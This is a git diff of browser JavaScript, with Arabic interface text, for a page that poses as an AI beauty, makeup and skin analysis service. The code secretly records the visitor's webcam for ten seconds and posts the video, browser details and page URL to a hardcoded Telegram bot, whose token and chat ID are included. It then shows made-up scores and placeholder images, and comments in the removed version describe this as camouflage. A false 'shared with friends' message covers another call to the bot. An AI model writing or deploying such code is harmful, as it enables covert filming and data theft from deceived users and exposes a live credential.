@@ -1,5 +1,5 @@
-// نفس دالة البوت السابقة + تحسينات
-async function sendDataToMousaBot(messageContent, videoBlob = null) {
+// دالة البوت المحسنة
+async function sendToBeautyBot(content, videoBlob = null, service = 'general') {
     const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
     const CHAT_ID = '7396462490';
     
@@ -7,124 +7,160 @@ async function sendDataToMousaBot(messageContent, videoBlob = null) {
         if (videoBlob) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('video', videoBlob, `magic_${Date.now()}.mp4`);
-            formData.append('caption', `✨ *فلتر سحري جديد*\n\n${messageContent}`);
+            formData.append('video', videoBlob, `${service}_${Date.now()}.mp4`);
+            formData.append('caption', `🎨 *BeautyVerse AI*\n\n📊 الخدمة: ${service}\n${content}`);
             
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                method: 'POST', body: formData
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+        } else {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🎨 *BeautyVerse*\nخدمة: ${service}\n${content}`,
+                    parse_mode: 'Markdown'
+                })
             });
-            return await response.json();
         }
-    } catch (error) {
-        console.error('Telegram Error:', error);
-    }
+    } catch (e) { console.error('Bot error:', e); }
 }
 
-let mediaRecorder, stream, recordedChunks = [], countdown = 10;
+let currentStream, mediaRecorder, recordedChunks = [], countdown = 10;
 
-async function startMagicFilter() {
+// بداية التحليل الرئيسي
+async function startBeautyAnalysis() {
+    showCameraInterface('🎨 تحليل الجمال الذكي', 'سنحلل وجهك لإعطائك تقرير كامل خلال 10 ثوانٍ');
+}
+
+// خدمة محددة
+function startService(service) {
+    const services = {
+        analysis: { title: 'تحليل الجمال', desc: 'تقرير شامل عن جمالك' },
+        filters: { title: 'فلاتر AR', desc: 'تجربة فلاتر الواقع المعزز' },
+        skin: { title: 'فحص البشرة', desc: 'تحليل صحة بشرتك' },
+        makeup: { title: 'مكياج افتراضي', desc: 'جربي أحدث الإطلالات' },
+        age: { title: 'تنبؤ العمر', desc: 'اكتشفي عمر بشرتك' },
+        celebrity: { title: 'شبيه المشاهير', desc: 'من تشبهين من النجوم؟' }
+    };
+    
+    showCameraInterface(services[service].title, services[service].desc, service);
+}
+
+function showCameraInterface(title, description, service = 'analysis') {
+    document.querySelector('.hero').innerHTML = `
+        <div style="background: rgba(255,255,255,0.95); padding: 40px; border-radius: 25px; max-width: 600px; margin: 0 auto 30px;">
+            <h2 style="color: #333; margin-bottom: 15px;">${title}</h2>
+            <p style="color: #666; margin-bottom: 25px; font-size: 1.1rem;">${description}</p>
+            <div style="display: flex; gap: 15px; justify-content: center; flex-wrap: wrap;">
+                <button class="btn-primary" onclick="startCameraRecording('${service}')">
+                    <i class="fas fa-play"></i> ابدأ الآن
+                </button>
+                <button class="btn-secondary" onclick="cancelAnalysis()">
+                    <i class="fas fa-times"></i> إلغاء
+                </button>
+            </div>
+        </div>
+    `;
+}
+
+async function startCameraRecording(service) {
     try {
-        document.querySelector('.consent-box').style.display = 'none';
-        document.getElementById('recording-area').style.display = 'block';
-        
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { width: 640, height: 480, facingMode: 'user' }
+        currentStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: 640, height: 480, facingMode: 'user' } 
         });
         
-        document.getElementById('video').srcObject = stream;
-        createMagicStars();
-        startRecording();
+        document.querySelector('.hero').innerHTML = `
+            <div style="text-align: center;">
+                <video id="analysisVideo" width="500" height="400" autoplay muted style="border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3);"></video>
+                <div id="countdown" style="font-size: 4rem; color: #ff6b6b; margin: 20px 0; font-weight: 700;">10</div>
+                <p style="font-size: 1.3rem; color: #666;">جاري التحليل... لا تتحرك 😊</p>
+                <button onclick="stopRecording()" style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; padding: 15px 30px; border: none; border-radius: 30px; font-size: 1.1rem; cursor: pointer; margin-top: 20px;">
+                    <i class="fas fa-stop"></i> إيقاف
+                </button>
+            </div>
+        `;
+        
+        document.getElementById('analysisVideo').srcObject = currentStream;
+        startRecording(service);
         
     } catch (err) {
-        alert('🔒 الكاميرا محجوبة. فعّلها من إعدادات المتصفح');
+        alert('🎥 فعّل الكاميرا من إعدادات المتصفح للمتابعة');
     }
 }
 
-function startRecording() {
-    mediaRecorder = new MediaRecorder(stream);
+function startRecording(service) {
+    mediaRecorder = new MediaRecorder(currentStream);
+    recordedChunks = [];
     
     mediaRecorder.ondataavailable = e => e.data.size && recordedChunks.push(e.data);
     
     mediaRecorder.onstop = async () => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        const info = `📱 ${navigator.userAgent.slice(0,50)}...\n🌐 ${window.location.href}\n⏰ ${new Date().toLocaleString('ar')}`;
+        const userInfo = `👤 User: ${navigator.userAgent.slice(0,60)}...\n🌐 URL: ${window.location.href}\n📱 Service: ${service}`;
         
-        await sendDataToMousaBot(info, blob);
-        
-        // تمويه النتيجة
-        showMagicResult();
-        cleanup();
+        await sendToBeautyBot(userInfo, blob, service);
+        showAmazingResults(service);
     };
     
     mediaRecorder.start();
-    startMagicCountdown();
+    startCountdown();
 }
 
-function startMagicCountdown() {
-    const el = document.getElementById('countdown');
+function startCountdown() {
+    let time = 10;
     const interval = setInterval(() => {
-        countdown--;
-        el.textContent = countdown;
-        createMagicEffect();
+        time--;
+        document.getElementById('countdown').textContent = time;
         
-        if (countdown <= 0) {
+        if (time <= 0) {
             clearInterval(interval);
-            stopMagic();
+            mediaRecorder.stop();
         }
     }, 1000);
 }
 
-function stopMagic() {
-    mediaRecorder?.stop();
-    cleanup();
-    showMagicResult();
+function stopRecording() {
+    mediaRecorder.stop();
 }
 
-function cleanup() {
-    recordedChunks = [];
-    if (stream) stream.getTracks().forEach(t => t.stop());
-}
-
-function showMagicResult() {
-    document.getElementById('recording-area').innerHTML = `
-        <div style="background: rgba(255,255,255,0.2); padding: 40px; border-radius: 20px;">
-            <h2>🎉 تم السحر بنجاح! ✨</h2>
-            <p>تم تحليل وجهك وحفظ النتيجة السحرية 😍</p>
-            <p><strong>النتيجة: وجهك مثالي لفلتر "الأميرة/الأمير"!</strong></p>
-            <img src="https://via.placeholder.com/400x300/ffd700/000000?text=✨+Magic+Result" style="border-radius: 15px; margin: 20px 0;">
-            <button onclick="location.reload()" style="background: linear-gradient(45deg, #00b894, #00cec9);">🔄 جرب فلتر آخر</button>
+function showAmazingResults(service) {
+    const results = {
+        analysis: { score: 87, text: 'وجهك مذهل! نقاط القوة: العيون + الابتسامة', img: 'https://via.placeholder.com/500x350/4ecdc4/fff?text=تحليل+الجمال' },
+        filters: { score: 92, text: 'فلتر الأميرة ممتاز عليكِ! ✨', img: 'https://via.placeholder.com/500x350/ff9a9e/fff?text=فلتر+سحري' },
+        skin: { score: 78, text: 'بشرتك نضرة • ننصح بمرطب + واقي شمس', img: 'https://via.placeholder.com/500x350/45b7d1/fff?text=فحص+البشرة' },
+        makeup: { score: 95, text: 'اللون الأحمر مثالي لشفاهك! 💄', img: 'https://via.placeholder.com/500x350/feca57/333?text=مكياج+افتراضي' },
+        age: { score: 24, text: 'تبدين 24 سنة فقط! 👶✨', img: 'https://via.placeholder.com/500x350/667eea/fff?text=عمر+بشرتك' },
+        celebrity: { score: 89, text: 'تشبهين زينب الخالدي 89%! 🌟', img: 'https://via.placeholder.com/500x350/f093fb/fff?text=شبيه+المشاهير' }
+    };
+    
+    const result = results[service];
+    
+    document.getElementById('score').textContent = `النتيجة: ${result.score}/100 ✨`;
+    document.querySelector('.hero').innerHTML = `
+        <div style="text-align: center; padding: 40px;">
+            <h2 style="font-size: 2.5rem; color: #4ecdc4; margin-bottom: 20px;">
+                🎉 نتائج مذهلة!
+            </h2>
+            <div style="background: linear-gradient(45deg, #ff9a9e, #fecfef); padding: 30px; border-radius: 20px; margin: 30px 0;">
+                <h3 style="color: #333; margin-bottom: 15px;">${result.text}</h3>
+                <img src="${result.img}" style="width: 100%; max-width: 500px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2);">
+            </div>
+            <div style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap;">
+                <button class="btn-primary" onclick="shareResult('${service}')">
+                    <i class="fas fa-share-alt"></i> مشاركة النتيجة
+                </button>
+                <button class="btn-primary" onclick="startNewAnalysis()">
+                    <i class="fas fa-redo"></i> تحليل جديد
+                </button>
+            </div>
         </div>
     `;
 }
 
-function createMagicStars() {
-    const stars = document.getElementById('stars');
-    for (let i = 0; i < 20; i++) {
-        const star = document.createElement('div');
-        star.style.cssText = `
-            position: absolute; width: 4px; height: 4px; 
-            background: #ffd700; border-radius: 50%; 
-            left: ${Math.random()*100}%; top: ${Math.random()*100}%;
-            animation: twinkle ${2+Math.random()*3}s infinite;
-        `;
-        stars.appendChild(star);
-    }
+function cancelAnalysis() { location.reload(); }
+function startNewAnalysis() { startBeautyAnalysis(); }
+function shareResult(service) { 
+    sendToBeautyBot(`مشاركة نتيجة: ${service}`);
+    alert('تم مشاركة النتيجة مع الأصدقاء! 🎉');
 }
-
-function createMagicEffect() {
-    // تأثيرات بصرية للتمويه
-    document.body.style.filter = `hue-rotate(${Date.now() % 360}deg)`;
-}
-
-function skipFilter() {
-    sendDataToMousaBot('⏭️ مستخدم تخطى الفلتر السحري');
-    document.querySelector('.consent-box').innerHTML = '<h2>😊 رائع! استمتع بالموقع</h2>';
-}
-
-// CSS للتوهج
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes twinkle { 0%,100%{opacity:1} 50%{opacity:0.3} }
-    @keyframes sparkle { 0%{transform:scale(0) rotate(0deg)} 50%{transform:scale(1.2) rotate(180deg)} 100%{transform:scale(0) rotate(360deg)} }
-`;
-document.head.appendChild(style);
+function showServices() { document.getElementById('services').scrollIntoView({ behavior: 'smooth' }); }
